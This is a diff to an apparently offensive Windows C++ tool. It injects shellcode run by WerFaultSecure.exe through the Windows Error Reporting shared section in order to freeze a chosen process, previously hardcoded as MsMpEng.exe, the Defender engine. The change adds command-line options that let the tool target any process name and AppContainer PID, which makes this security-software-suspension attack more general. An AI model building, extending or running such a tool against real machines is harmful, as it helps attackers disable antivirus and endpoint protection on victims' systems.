@@ -31,9 +31,10 @@ void
 usage()
 {
     wprintf(
-        L"-h\t: Show this help message\n"
-        L"-p\t: AppContainer Process ID\n"
-        L"-t\t: Target process name (case sensitive)\n"
+        L"\n"
+        L" -h\t: Show this help message\n"
+        L" -p\t: AppContainer Process ID\n"
+        L" -t\t: Target process name (case sensitive)\n"
     );
 }
 
@@ -276,7 +277,23 @@ int wmain(int argc, wchar_t* argv[])
     DWORD AppContainerProcessId = 0;
     const wchar_t* TargetProcessName = nullptr;
 
-    if (argc < 3) {
+    if (argc < 2) {
+        usage();
+        return 0;
+    }
+
+    for (int i = 1; i < argc; ++i) {
+        if (!wcscmp(argv[i], L"-h")) {
+            usage();
+            return 0;
+        }
+        else if (!wcscmp(argv[i], L"-p") && i + 1 < argc)
+            AppContainerProcessId = wcstoul(argv[++i], nullptr, 0);
+        else if (!wcscmp(argv[i], L"-t") && i + 1 < argc)
+            TargetProcessName = argv[++i];
+    }
+
+    if (TargetProcessName == nullptr) {
         usage();
         return 0;
     }
@@ -314,7 +331,7 @@ int wmain(int argc, wchar_t* argv[])
     // the payload that will be executed by WerFaultSecure.exe.
     // It is responsible for establishing a communication channel with
     // the driver, and freezing the process we specify below as first parameter.
-    if (!AllocateSgrmShellcode(L"MsMpEng.exe", &pShellcode, &dwShellcodeLength) ||
+    if (!AllocateSgrmShellcode(TargetProcessName, &pShellcode, &dwShellcodeLength) ||
         !pShellcode ||
         !dwShellcodeLength ||
         dwShellcodeLength < 0) {
@@ -400,10 +417,10 @@ int wmain(int argc, wchar_t* argv[])
     // faultrep.dll version 6.3.9600.17415 (winblue_r4.141028-1500)
     // Sha1 hash: B241A5B14F8A8E478B27CB79B7552F00AA01C538
     pSectionHeader = (PWER_MAPPED_SECTION_HEADER)pLocalSharedSection;
-    processId = 0;
+    processId = AppContainerProcessId;
     value = 0x00F8;
 
-    processId = FindProcessId(L"CalculatorApp.exe");
+    //processId = FindProcessId(L"CalculatorApp.exe");
     if (!processId) {
         printf("[-] Error finding AppContainer process.\n");
         goto Exit;
